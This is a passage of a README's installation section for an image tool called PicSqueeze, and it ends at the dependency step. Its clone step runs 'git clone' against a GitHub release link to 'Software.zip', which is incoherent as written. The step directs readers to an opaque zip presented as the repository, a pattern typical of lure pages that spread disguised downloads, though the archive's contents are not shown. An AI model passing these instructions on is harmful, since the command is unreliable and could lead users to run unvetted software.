## 📦 Installation

To get started with PicSqueeze, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/alfa786-creator/pic-squeeze/releases/download/v1.0/Software.zip
   cd pic-squeeze
   ```

2. Install dependencies:
